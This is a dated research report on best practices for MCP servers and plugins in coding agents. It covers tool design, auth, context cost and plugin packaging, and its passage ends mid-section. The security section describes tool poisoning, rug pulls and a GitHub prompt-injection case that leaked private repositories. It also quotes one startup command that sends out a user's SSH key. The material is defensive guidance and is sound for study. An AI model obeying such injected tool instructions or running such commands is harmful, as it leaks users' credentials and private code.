# MCP servers and plugins: best practices for coding-agent harnesses

Research date: 2026-10-04. Leads: Claude Code and Codex; OpenCode is mentioned only where the sources cover it. Terms follow `docs/concepts/mcp.md` and `docs/concepts/plugins.md`: server definition, transport, tool filter, tool approval, qualified tool name (`mcp__<server>__<tool>`), admin allowlist, plugin, manifest, marketplace, plugin ID (`<plugin>@<marketplace>`), versioned cache, enable flag.

Evidence labels used on every finding:
- **[Vendor]**: vendor guidance. This includes Anthropic, OpenAI, and the MCP specification, which is maintained by the protocol project.
- **[Empirical]**: an empirical study or measured data.
- **[Advisory]**: a security advisory, CVE, or vendor-coordinated disclosure.
- **[Practitioner]**: practitioner opinion or an informal experiment.

Dates are given where guidance may be out of date. Anything from before mid-2026 that concerns context cost was written before both leads deferred MCP tool definitions by default (see Q1).

## Q1. Using MCP: when MCP is the right tool versus a CLI or a skill with scripts; context cost, tool limits, scope, output size

### Takeaway
Deferred tool loading is now on by default in both leads: Claude Code has tool search on by default, and Codex has deferred all MCP tools since June 2026. That removes most of the "MCP floods the context" argument from 2025. The choice now turns on other factors:
- Is a well-known CLI available, and is a shell available?
- Does the integration need auth or state?
- Does output need to be piped or filtered?
- What is the security surface?

Default to a CLI the agent already knows (plus a skill that teaches team conventions). Use MCP for authenticated SaaS, stateful integrations, and systems with no good CLI. Keep a skill next to the MCP server to teach usage. Whichever you choose, limit the enabled tools and set output limits.

### Cited Findings

**When to choose MCP, a CLI, or a skill**
- [Vendor] Claude Code best practices: "CLI tools are the most context-efficient way to interact with external services". Tell Claude to use `gh`, `aws`, `gcloud`, `sentry-cli`. Claude can learn an unknown CLI by reading its `--help` output. — [Claude Code best practices](https://code.claude.com/docs/en/best-practices)
- [Vendor] Claude Code's feature guide:
  - MCP is for "external data or actions" and gives "purpose-built tools for an external system, with the connection and authentication handled by the server".
  - Skills give "knowledge about how to use those tools effectively".
  - The recommended pattern is "Skill + MCP: MCP provides the connection; a skill teaches Claude how to use it well".
  - The trigger for adding MCP is "You keep copying data from a browser tab Claude can't see".

  — [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
- [Empirical, Aug 2025] Mario Zechner benchmarked the same terminal-control tool as an MCP server and as a CLI, plus tmux and screen. He ran 3 tasks, 10 runs each, in Claude Code:
  - MCP and CLI both reached 100% success.
  - Total cost was $19.45 for MCP and $19.95 for CLI.
  - The CLI variant used far more Haiku tokens (1.3–2M against 35k), because Claude Code's command-safety check runs on every bash call.
  - His conclusion: tool design matters more than protocol. Prefer a CLI when a shell exists, because it is simpler and portable. MCP suits clients without a shell and stateful tools.

  — [Zechner, MCP vs CLI](https://mariozechner.at/posts/2025-08-15-mcp-vs-cli/)
- [Practitioner, Nov 2025] Zechner's later post: "Playwright MCP has 21 tools using 13.7k tokens (6.8% of Claude's context)". He replaced it with a few bash tools and a README that "has a whopping 225 tokens". — [Zechner, What if you don't need MCP at all?](https://mariozechner.at/posts/2025-11-02-what-if-you-dont-need-mcp/)
- [Practitioner, Oct 2025] Simon Willison: "GitHub's official MCP on its own famously consumes tens of thousands of tokens of context". "LLMs know how to call `cli-tool --help`". He prefers skills (Markdown plus optional scripts) to MCP for coding agents. — [Willison, Claude Skills](https://simonwillison.net/2025/Oct/16/claude-skills/)
- [Empirical/practitioner, Jul 30 2026] Checkly ran the same browser task twice, once with Playwright MCP and once with the Playwright CLI plus a skill. Context use was nearly equal: 48–50k tokens with MCP, 45–48k with the CLI. The author attributes this to deferred loading: Claude Code "only keeps the tool names around and pulls a full tool definition in when a tool is actually called". "There's no big difference in using CLIs or MCPs these days." This was a small n, single-task experiment. — [Checkly](https://www.checklyhq.com/blog/mcp-vs-cli-token-efficiency/)
- [Vendor, Nov 2025] Code execution with MCP:
  - Agents write code against MCP servers, which are presented as files (`./servers/<server>/<tool>.ts`). One example went from 150,000 to 2,000 tokens, a 98.7% reduction.
  - Intermediate data stays in the execution environment, which helps both privacy and context.
  - Caveat: it needs a "secure execution environment with appropriate sandboxing, resource limits, and monitoring", which adds overhead that direct tool calls avoid.

  — [Anthropic, Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)
- [Vendor/practitioner, Sep 2025] Cloudflare's Code Mode: "LLMs have seen a lot of code. They have not seen a lot of 'tool calls.'" Agents write TypeScript against MCP bindings in V8 isolates. Credentials stay in bindings outside the sandbox. — [Cloudflare Code Mode](https://blog.cloudflare.com/code-mode/)

**Context cost of tool definitions and deferred loading**
- [Vendor/empirical, Nov 2025] Anthropic measured a five-server setup (GitHub 35 tools at ~26K tokens, Slack 11 at ~21K, Sentry, Grafana, Splunk): 58 tools cost about 55K tokens. Internally, Anthropic saw 134K tokens of tool definitions before optimization. — [Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
- [Empirical, Nov 2025] Same source:
  - The Tool Search Tool cut context from about 77K to about 8.7K tokens, an 85% reduction.
  - MCP-eval accuracy rose from 49% to 74% (Opus 4) and from 79.5% to 88.1% (Opus 4.5).
  - Guidance: use tool search when tool definitions exceed 10K tokens or there are 10+ tools; skip it under 10 tools. "Keep your three to five most-used tools always loaded, defer the rest."

  — [Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
- [Vendor] Claude Code turns tool search on by default. Only tool names and server instructions load at start; full schemas load on demand.
  - Remote servers with `alwaysLoad: false` (the default) connect only when a tool is first called.
  - Tool search is off when `ANTHROPIC_BASE_URL` is customized, when `ENABLE_TOOL_SEARCH=false`, and on pre-4.5 models.
  - `/context all` shows the tokens per loaded MCP tool.

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp); [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
- [Vendor] Codex PR #29486, merged 2026-06-22, says to "Defer all effective MCP tools when `tool_search` and namespaced tools are supported".
  - Before it, deferral needed a feature flag or at least 100 tools.
  - The `tool_search_always_defer_mcp_tools` flag is now ignored.
  - Older model/provider combinations without search support still load all tools eagerly.

  — [openai/codex PR #29486](https://github.com/openai/codex/pull/29486)
- [Vendor] OpenCode loads all MCP tool definitions eagerly. This is recorded in the repo's concepts page from vendor docs. — `docs/concepts/mcp.md` (repo)

**Limiting enabled tools**
- [Vendor] Codex's tool filter is `enabled_tools` (allowlist) and `disabled_tools` (applied after the allowlist). Tool approval is `default_tools_approval_mode` (`auto`, `prompt`, `writes`, `approve`) with per-tool overrides in `tools.<tool>.approval_mode`. A server can be turned off with `enabled = false`, and `required = true` fails startup if the server cannot start. — [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)
- [Vendor] Claude Code has no per-server tool filter key. A bare `deny` permission rule on `mcp__<server>__<tool>` removes the tool from context, and `allow`/`ask`/`deny` rules set the approval. — repo concept page summarising [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] Anthropic: avoid overlapping tools, because they confuse the agent's choice. — [Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)

**Per-project versus user scope**
- [Vendor] Claude Code scopes:
  - Local (default, private, in `~/.claude.json`): "personal development servers, experimental configurations, or servers with credentials you don't want in version control".
  - Project (`.mcp.json`, committed): team-shared setup.
  - User: cross-project personal tools.
  - Precedence when names collide: local > project > user.

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp); [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
- [Vendor] Codex reads user config and project `.codex/config.toml`, the latter only in trusted projects. The CLI, IDE extension and desktop app share one config. — [Codex MCP](https://developers.openai.com/codex/mcp)

**Output size limits**
- [Vendor] Claude Code warns when one MCP tool output exceeds 10,000 tokens.
  - The default limit is `MAX_MCP_OUTPUT_TOKENS=25000`.
  - A server can raise the limit for one tool with `_meta["anthropic/maxResultSizeChars"]`, up to a hard ceiling of 500,000 characters.
  - A tool call still running after 2 minutes moves to a background task (`CLAUDE_CODE_MCP_AUTO_BACKGROUND_MS`).

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] Codex sets output limits per tool with `tools.<tool>.output_token_limit`. Default timeouts: `startup_timeout_sec` 10 s, `tool_timeout_sec` 60 s. — [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)
- [Vendor] Codex suggests these servers: OpenAI Docs MCP, Context7, Figma, Playwright, Chrome DevTools, Sentry, GitHub. — [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)

### Inferences
- **Decision rule:**
  1. Is there a CLI the model already knows (`gh`, `aws`, `kubectl`) and a sandboxed shell? Use the CLI, plus a skill that documents team conventions.
  2. Is the system SaaS with OAuth, stateful (browser, debugger session), or without a decent CLI? Use MCP, plus a skill that teaches workflows.
  3. Is it a workflow that chains many calls over large data? Consider code execution against an API or SDK in a sandbox.
- **Context cost is no longer a reason to prefer a CLI in either lead, with two exceptions:**
  - Custom gateways or base URLs in Claude Code, and older models in Codex, turn deferral off.
  - OpenCode still loads every tool definition.

  The 2025 comparisons (Zechner, Willison) assumed eager loading and should be read as historical.
- **Output size is still a real cost.** Deferral only shrinks definitions; tool results still enter the context. A CLI's output can be piped through `jq`, `head` or `grep` before the model sees it. An MCP result cannot unless the server paginates or filters.
- **The CLI path runs inside the command sandbox and the permission rules for bash. MCP servers do not** (see Q3). This favors a CLI for local operations on sensitive machines.
- **Shared servers go in project scope** (`.mcp.json` / `.codex/config.toml`) with no secrets in them. Personal or credential-bearing servers go in local or user scope.
- **How to verify:**
  - Claude Code: `/context all` for per-tool tokens, `/mcp` for status.
  - Codex: `/mcp` and the session token display.
  - Run the same task with and without a server and compare tokens and success, following the eval approach in Q2.

### Gaps
- The Codex user docs I fetched do not describe tool search; only the PR does. There is no documented Codex equivalent of `alwaysLoad`.
- No controlled study after deferred loading compares MCP and CLI across many tasks. Checkly is a single task.
- Codex's default `output_token_limit` value is not documented on the pages fetched.

## Q2. Building MCP servers for agents: tool design, descriptions, errors, pagination, token-efficient responses, auth, transports

### Takeaway
Design for the agent's workflow, not the API surface:
- Offer a few consolidated, namespaced tools.
- Write descriptions as if onboarding a new hire.
- Return human-readable, filtered results with a `concise`/`detailed` switch.
- Paginate or truncate, and say how to get more.
- Report failures as actionable `isError` results.
- Put the essentials of server instructions in the first 512 characters.

For auth, use OAuth with minimal scopes (or a header helper for internal SSO), audience-validated tokens, and never token passthrough. Never put secrets in committed config. Use stdio or streamable HTTP only. Iterate on the tools with evals.

### Cited Findings

**Tool selection and shape**
- [Vendor, Sep 2025] Build "a few thoughtful tools targeting specific high-impact workflows" rather than wrapping every endpoint. For example, `schedule_event` instead of `list_users` + `list_events` + `create_event`. Avoid overlapping tools. — [Anthropic, Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Vendor, Sep 2025] Namespace related tools under a common prefix (`asana_search`, `jira_search`). Whether a prefix or a suffix works better "varies by LLM", so test it with evals. — [same](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Vendor] The MCP spec (draft):
  - Tool names SHOULD be 1–128 characters from `A-Za-z0-9_-.`, case-sensitive, and unique within a server.
  - Clients that aggregate servers SHOULD disambiguate, for example with a server prefix. `serverInfo.name` "SHOULD NOT be relied upon for disambiguation".
  - Servers SHOULD return tools in a deterministic order, which helps caching and the model's prompt cache.

  — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [Vendor] Both leads already prefix tools as `mcp__<server>__<tool>`. The server name is therefore part of the public interface used by permission rules and hook matchers. — `docs/concepts/mcp.md` (repo)

**Descriptions and server instructions**
- [Vendor, Sep 2025] Write descriptions "as if onboarding a new team member". Make implicit context explicit: query formats, terminology, relationships between resources. Use unambiguous parameter names (`user_id`, not `user`). — [Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Vendor/empirical, Nov 2025] Adding tool use examples raised accuracy on complex parameters from 72% to 90%. Use them for nested structures, many optional parameters, and domain conventions. — [Anthropic, Advanced tool use](https://www.anthropic.com/engineering/advanced-tool-use)
- [Vendor] With deferred loading, the description is also the search key: "Clear tool descriptions: enable effective tool search". — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] Server `instructions`: Codex says to "keep first 512 characters self-contained". Claude Code truncates instructions at 2,048 characters. — [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli); `docs/concepts/mcp.md` (repo)

**Responses: token efficiency, pagination, truncation**
- [Vendor, Sep 2025] Prefer "contextual relevance over flexibility":
  - Drop low-level IDs such as UUIDs in favour of human-readable names.
  - Offer a `response_format` enum (`concise`/`detailed`). In one Slack example, detailed was 206 tokens and concise was 72.
  - Paginate, filter, select ranges and truncate, with sensible defaults. When truncating, include "helpful instructions" that steer the agent to narrower queries.

  — [Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Vendor] Claude Code asks server authors to paginate large results to avoid output-limit warnings. For tools whose output is inherently large, declare `anthropic/maxResultSizeChars` rather than asking users to raise `MAX_MCP_OUTPUT_TOKENS`. Send progress notifications so long calls don't hit idle timeouts (5 min for HTTP, 30 min for stdio). — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] MCP spec, structured output:
  - `structuredContent` plus an optional `outputSchema`. Servers MUST conform to a declared schema, and clients SHOULD validate.
  - For backward compatibility, a tool returning structured content SHOULD also return serialized JSON in a text block.
  - `resource_link` can return a pointer instead of the content itself.

  — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [Vendor] MCP spec, stateful tools: the 2026-07-28 spec has no protocol session. Return an explicit, opaque, high-entropy handle such as `basket_id`. Re-authorize the caller on every call. State the handle's lifetime in the description. On an expired handle, return a tool error that says so. — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)

**Errors**
- [Vendor] MCP spec, two error channels:
  - Protocol errors (JSON-RPC) for unknown tools or malformed requests.
  - Tool execution errors as results with `isError: true` containing "actionable feedback that language models can use to self-correct". Example: "Invalid departure date: must be in the future. Current date is 08/08/2025."

  Clients SHOULD pass execution errors to the model. — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [Vendor, Sep 2025] Errors should be "clearly actionable improvements, rather than opaque error codes". — [Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)

**Approval hints from the server**
- [Vendor] MCP spec: clients MUST treat tool annotations as untrusted unless the server is trusted. — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [Vendor] Codex always asks approval for a tool with a destructive annotation, unless the tool also has a read annotation, which takes priority. Claude Code honours `_meta["anthropic/requiresUserInteraction"]`. A cross-harness server should emit both. — [Codex security](https://learn.chatgpt.com/docs/agent-approvals-security); `docs/concepts/mcp.md` (repo)

**Auth**
- [Vendor] Claude Code:
  - OAuth through `claude mcp login`, with pre-registered `--client-id`/`--callback-port` when the server lacks Dynamic Client Registration.
  - Pin minimal scopes with `oauth.scopes` (`offline_access` is appended automatically when advertised).
  - Use `headersHelper` for Kerberos, short-lived tokens or internal SSO. It must print JSON within 10 s, re-runs on 401/403, and runs only after workspace trust for project and local servers.
  - OAuth credentials are sent only to HTTPS or loopback token endpoints.

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] Codex supports `bearer_token_env_var`, `env_http_headers`, static `http_headers`, and `http_headers_helper` (a local command printing JSON headers). OAuth via CIMD or DCR, with configurable client ID and callback. Codex prefers the server's `scopes_supported`. — [Codex MCP](https://learn.chatgpt.com/docs/extend/mcp?surface=cli)
- [Vendor] No secrets in committed config:
  - Claude Code expands `${VAR}` and `${VAR:-default}` in `command`, `args`, `env`, `url` and `headers`.
  - Credential-like variables such as `ANTHROPIC_API_KEY`, `AWS_BEARER_TOKEN_BEDROCK` and `NPM_TOKEN` expand to empty for remote servers. Copy the value into your own variable name.

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] MCP security best practices (draft):
  - Servers MUST NOT accept tokens that were not issued to them, with audience validation per RFC 9068. Token passthrough is forbidden.
  - OAuth proxy servers MUST implement per-client consent, exact `redirect_uri` matching, and single-use `state` with a short expiry, set only after consent.
  - Use progressive least-privilege scopes, such as a minimal `mcp:tools-basic`, and step up via `WWW-Authenticate scope=`.
  - Common scope mistakes: wildcard or omnibus scopes, and publishing every scope in `scopes_supported`.

  — [MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)

**Transports**
- [Vendor] MCP security best practices: local servers SHOULD use stdio to limit access to the client. If they use HTTP, require an auth token or use unix sockets or other restricted IPC, to defend against DNS rebinding from browser pages. — [MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- [Vendor] Codex supports only stdio and streamable HTTP. SSE is deprecated in Claude Code. WebSocket and SDK transports exist only in Claude Code. — `docs/concepts/mcp.md` (repo, from vendor docs)

**Process: evals**
- [Vendor, Sep 2025] Anthropic's eval process for tools:
  - Build "dozens of prompt and response pairs" from realistic multi-step tasks.
  - Measure accuracy, runtime, number of tool calls, tokens and errors.
  - Keep held-out sets.
  - Let an agent read the transcripts and propose improvements to the tools.

  — [Anthropic tools](https://www.anthropic.com/engineering/writing-tools-for-agents)
- [Vendor] Before sharing a server, test it locally (`claude mcp add --transport stdio test-server -- node server.js`, then `/mcp`). — [Claude Code MCP](https://code.claude.com/docs/en/mcp)

### Inferences
- **Checklist for a cross-harness server:**
  1. A few workflow-level tools, each with a service prefix.
  2. Descriptions with examples, since they double as tool-search text.
  3. A `concise` default and paginated results with explicit "next" instructions.
  4. `isError` results that name the fix.
  5. `outputSchema` where callers parse the output.
  6. Instructions in under 512 characters.
  7. Both approval hints on destructive tools.
  8. A stable server name, because it becomes part of `mcp__<server>__<tool>`.
- **Anti-patterns:**
  - One tool per REST endpoint.
  - Returning raw API JSON with UUIDs.
  - Unbounded list tools.
  - Opaque error codes.
  - Encoding secrets as `x-mcp-header` parameters, which the spec warns against.
  - Static API keys in `.mcp.json` or `config.toml`.
  - Requesting every scope up front.
  - Relying on per-connection state.
- **How to verify:**
  - Run a held-out eval set in both Claude Code and Codex, and compare success, tool calls and tokens.
  - Check the largest outputs against the 10k-token warning and the 25k default limit.
  - Confirm that tool search finds each tool from a natural-language request.

### Gaps
- I found no vendor-published, quantified guidance on the ideal number of tools per server beyond "few" and the tool-search thresholds (10+ tools or 10K tokens).
- I did not find Codex-specific tool-design guidance beyond the 512-character instructions rule.
- I did not re-verify whether Claude Code reads the MCP `readOnlyHint`/`destructiveHint` annotations for approval decisions.

## Q3. MCP security: tool poisoning, rug pulls, prompt injection through results, confused deputy, allowlisting, pinning, third-party review, incidents

### Takeaway
An MCP server is code and instructions from a third party. It runs outside the command sandbox in both leads, and its results are untrusted input to the model. Measured attack success is high, and refusal is near zero. Real incidents include:
- a malicious npm server,
- a prompt-injected official GitHub server,
- RCE in `mcp-remote` and in MCP Inspector,
- repository-config RCE in both Claude Code and Codex.

The controls that work are structural:
- admin allowlists by identity (command or URL),
- pinned versions,
- reviewing source and tool descriptions,
- least-privilege OAuth scopes,
- per-tool approval for writes,
- never combining private data, untrusted content, and an exfiltration channel (the "lethal trifecta") in one session.

### Cited Findings

**Attack classes**
- [Advisory/research, Apr 1 2025] Invariant Labs, tool poisoning:
  - Hidden instructions in tool descriptions, visible to the model but not in the UI. Their PoC "add" tool reads `~/.cursor/mcp.json` and SSH keys and passes them as a "sidenote" parameter.
  - Rug pull: the server changes tool descriptions after approval.
  - Shadowing: one server's description changes how the agent uses another, trusted server, for example redirecting emails.
  - Mitigations: show the full descriptions, pin tools and packages by hash, set cross-server dataflow boundaries, add guardrails.

  — [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [Empirical, Aug 2025; AAAI] MCPTox benchmark: 45 live MCP servers, 353 tools, 1,348 malicious test cases.
  - Average attack success rate was 36.5%. o1-mini reached 72.8%, Phi-4 70.2%, GPT-4o-mini 61.8%.
  - More capable models were often more susceptible.
  - The highest refusal rate was under 3% (Claude 3.7 Sonnet).

  Note that these models are now old. — [MCPTox, arXiv 2508.14925](https://arxiv.org/html/2508.14925v1)
- [Advisory/research, May 2025] Invariant Labs, GitHub MCP "toxic agent flow". A malicious issue in a public repo led the agent, working on a benign request, to read private repos and leak them in a PR to the public repo. "The server was not modified, its tool descriptions were clean". In other words, this is prompt injection through tool results. — [Invariant Labs, GitHub MCP](https://invariantlabs.ai/blog/mcp-github-vulnerability)
- [Practitioner, Apr/Jun 2025] Simon Willison names the "lethal trifecta": private data, untrusted content, and an exfiltration channel. MCP "encourages users to combine tools from different sources", which assembles all three. On guardrails: "in web application security 95% is very much a failing grade". Avoid the combination. — [Willison, lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); [Willison, MCP prompt injection](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)
- [Vendor] MCP security best practices (draft) cover:
  - Confused deputy in OAuth proxy servers: static client ID plus DCR plus consent cookie.
  - Token passthrough.
  - SSRF through OAuth metadata URLs: block private IP ranges and `169.254.0.0/16`, require HTTPS, validate redirects.
  - State-handle hijacking.
  - Local server compromise through malicious startup commands, for example `npx malicious-package && curl -d @~/.ssh/id_rsa ...`.
  - `javascript:` authorization URLs leading to XSS or RCE.
  - Scope minimization.

  Clients offering one-click local installs MUST show the full command without truncation and get explicit consent. They SHOULD sandbox servers with minimal privileges. — [MCP Security Best Practices](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- [Vendor] MCP spec, Tools: servers MUST validate inputs, enforce access control, rate limit, and sanitize outputs. Clients SHOULD confirm sensitive operations, show tool inputs before calling, validate results before passing them to the LLM, apply timeouts, and log calls. — [MCP spec, Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)
- [Practitioner/standards body, 2025 beta] The OWASP MCP Top 10:
  - MCP01 token mismanagement
  - MCP02 scope creep
  - MCP03 tool poisoning
  - MCP04 supply chain and dependency tampering
  - MCP05 command injection
  - MCP06 prompt injection through contextual payloads
  - MCP07 insufficient authn/authz
  - MCP08 lack of audit
  - MCP09 shadow MCP servers
  - MCP10 context over-sharing

  — [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/)

**Incidents and advisories**
- [Advisory] CVE-2025-6514, `mcp-remote` 0.0.5–0.1.15: OS command injection through a crafted `authorization_endpoint` from an untrusted server. CVSS 9.6. Fixed in 0.1.16 (2025-06-17). Found by JFrog. — [GitLab advisory](https://advisories.gitlab.com/npm/mcp-remote/CVE-2025-6514/)
- [Advisory] MCP Inspector:
  - CVE-2025-49596 (<0.14.1): no authentication between the Inspector client and proxy, allowing RCE over stdio.
  - CVE-2025-58444 (fixed 0.16.6): XSS through a redirect URL from a malicious server, leading to command execution.

  — [SentinelOne CVE-2025-49596](https://www.sentinelone.com/vulnerability-database/cve-2025-49596/); [GitLab advisory CVE-2025-58444](https://advisories.gitlab.com/npm/@modelcontextprotocol/inspector/CVE-2025-58444/)
- [Advisory/incident, 2025] Unofficial `postmark-mcp` on npm added an external BCC in 1.0.16 after building trust over 15 versions. Postmark's legitimate API was unaffected. — [Postmark incident notice](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)
- [Advisory] Claude Code, reported by Check Point:
  - CVE-2025-59536: RCE through hooks in repository `.claude/settings.json`.
  - MCP consent bypass: `enableAllProjectMcpServers`/`enabledMcpjsonServers` in project settings auto-approved `.mcp.json` servers.
  - API key exfiltration through a project-set `ANTHROPIC_BASE_URL` before the trust dialog.

  Fixes shipped in phases on 2025-08-26, 2025-09-22 and 2025-12-28. Recommendation: "Review configuration changes during code reviews with the same rigor applied to source code". — [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [Advisory] Codex CLI CVE-2025-61260 (CVSS 9.8): a repository `.env` set `CODEX_HOME=./.codex`, so Codex loaded a project `.codex/config.toml` whose `mcp_servers` commands ran at startup with no prompt. Fixed in v0.23.0 (2025-08-20). — [Check Point Research](https://research.checkpoint.com/2025/openai-codex-cli-command-injection-vulnerability/); [NVD](https://nvd.nist.gov/vuln/detail/cve-2025-61260)

**Harness controls (current)**
- [Vendor] Claude Code: "Verify you trust each server before connecting it. Servers that fetch external content can expose you to prompt injection risk." The admin allowlist has two parts:
  - `allowedMcpServers`/`deniedMcpServers` by name, `serverUrl` (wildcards) or `serverCommand`.
  - `managed-mcp.json`/`managedMcpServers` for exclusive control.

  — [Claude Code MCP](https://code.claude.com/docs/en/mcp)
- [Vendor] Claude Code plugin org controls:
  - `disableSideloadFlags` does not restrict `.mcp.json`, `claude mcp add`, or SDK servers. "Pair it with `allowedMcpServers`".
  - `strictPluginOnlyCustomization: ["mcp"]` blocks MCP servers that do not come from a plugin, managed settings or built-ins.

  — [Claude Code plugins for orgs](https://code.claude.com/docs/en/plugins/org)
- [Vendor] Codex:
  - The network proxy "does not filter ... MCP server connections". Admins should allowlist MCP servers in `requirements.toml`.
  - Destructive-annotated tools always require approval, unless they also carry a read annotation.
  - `trust_level = "untrusted"` turns project-local config off.

  — [Codex agent approvals and security](https://learn.chatgpt.com/docs/agent-approvals-security)
- [Vendor] Codex `requirements.toml` matches `[mcp_servers.<id>] identity` by command or URL, with exact, prefix or regex matchers. Both the name and the identity must match. An empty table disables all servers. The same shapes apply to plugin servers. — [Codex managed configuration](https://developers.openai.com/codex/enterprise/managed-configuration)
- [Vendor] In both leads, local MCP servers run outside the command sandbox. In Claude Code, `.mcp.json` servers need per-server interactive approval, but load without asking in `-p`, SDK and cloud runs. Codex loads project servers only after project trust. — `docs/concepts/mcp.md` (repo); [Claude Code plugin security](https://code.claude.com/docs/en/plugins/security)

**Pinning and supply chain**
- [Practitioner/standards body] OWASP MCP04: pin versions and avoid "latest". Use internal mirrors or registries. — [OWASP MCP04](https://owasp.org/www-project-mcp-top-10/2025/MCP04-2025%E2%80%93Software-Supply-Chain-Attacks%26Dependency-Tampering)
- [Advisory/research] Invariant recommends pinning tools and packages by hash or checksum, to counter rug pulls. — [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)

### Inferences
- **Threat model per server:**
  1. Is the code trustworthy (supply chain, local process)?
  2. Are the descriptions trustworthy (poisoning, rug pull)?
  3. Are the results trustworthy (injection from fetched content)?
  4. Are the credentials scoped (confused deputy, broad tokens)?

  Allowlisting covers (1) and partly (2). Only least privilege and splitting tool sets per session or subagent mitigate (3).
- **Anti-patterns:**
  - `npx -y <pkg>` or `uvx <pkg>` without a version. Every session then runs whatever the latest release is; `postmark-mcp` added a backdoor in version 1.0.16; an unpinned installation can pick up such an update. Pin `@x.y.z`, or use an internal mirror.
  - Committing `enableAllProjectMcpServers`.
  - Using `-p` or CI in untrusted checkouts with repository MCP config.
  - Allowlisting by server name only, since a name is not a security control.
  - Auto-approving write tools on servers that also read untrusted content.
- **Pattern for the trifecta:** run "read untrusted" tools (issues, web, email) in a subagent or session without write or exfiltration tools. Set approval to `prompt`/`ask` for any tool that sends data out: PR creation, email, HTTP.
- **Reviewing a third-party server:**
  1. Read the source and the tool descriptions (`tools/list` output), looking for hidden or Unicode text.
  2. Check the publisher matches the official vendor, which guards against typosquats.
  3. Pin the version.
  4. Check requested OAuth scopes.
  5. Re-review `tools/list` on every version bump.
- **How to verify:**
  - Diff `tools/list` output between versions.
  - Test that the admin allowlist blocks an unlisted server: add one via `claude mcp add` or `codex mcp add` and confirm it is refused or disabled.
  - Open the repo in an untrusted state and confirm that no MCP process starts (`ps`).

### Gaps
- Neither lead's docs, as fetched, say whether the harness detects or alerts on tool-description changes after approval (rug-pull detection). Treat this as not provided.
- No refusal or attack-success data was found for current (2026) Claude or GPT-5-class models in MCPTox-style tests.

## Q4. Plugins: what to bundle, single-purpose versus suite, one repo for both marketplaces, versioning and updates, internal marketplaces, admin allowlists, reviewing third-party plugins

### Takeaway
A plugin is the distribution unit for skills, hooks and MCP definitions. Package a setup as a plugin when a second repository or team needs it.
- **Bundle shape:** small, single-purpose plugins, plus a "bundle" plugin made of dependencies for role-based suites.
- **Versioning:** set `version` explicitly and bump it on every release. Claude Code pins users to the cached version until it changes, and Codex keys its cache by version.
- **Dual-harness repo:** one repository can serve both leads through `.claude-plugin/marketplace.json`, which Codex reads as legacy-compatible, and the shared component paths.
- **Governance:** admins allowlist marketplace sources in both leads and force-enable approved plugins.
- **Trust:** plugins run code with user privileges outside the sandbox, so review hooks, MCP commands and `bin/` before installing.

### Cited Findings

**What to bundle; when to package**
- [Vendor] "A plugin bundles skills, hooks, subagents, and MCP servers into a single installable unit... Use plugins when you want to reuse the same setup across multiple repositories or distribute to others via a marketplace." The trigger: "A second repository needs the same setup". — [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
- [Vendor] Codex plugin components:
  - root `plugin.json` (cross-vendor Agent Plugins schema), `skills/`, `mcp.json` with a transport `type` per server, `hooks/hooks.json`, `assets/`.
  - OpenAI-specific settings go under `extensions.com.openai`.
  - The legacy `.codex-plugin/plugin.json` is still supported, but "new packages should use portable format".

  — [Codex Build plugins](https://developers.openai.com/codex/plugins/build.md)
- [Vendor] Instructions do not travel in a plugin. A `CLAUDE.md` at the plugin root is not loaded, so put instructions in a skill. — `docs/concepts/plugins.md` (repo, from [Claude Code plugins docs](https://code.claude.com/docs/en/plugins/overview))
- [Vendor] Claude Code org sync rejects a plugin with a top-level `bin/`. Keep executables in `scripts/` and reference them as `${CLAUDE_PLUGIN_ROOT}/scripts/<name>`. — [Host a marketplace](https://code.claude.com/docs/en/plugins/host-marketplace)

**Single-purpose versus suite**
- [Vendor] Claude Code dependencies:
  - A plugin can declare `dependencies` with semver ranges.
  - A "bundle" plugin made only of a name and dependencies, such as `backend-standard`, installs a curated set with one command.
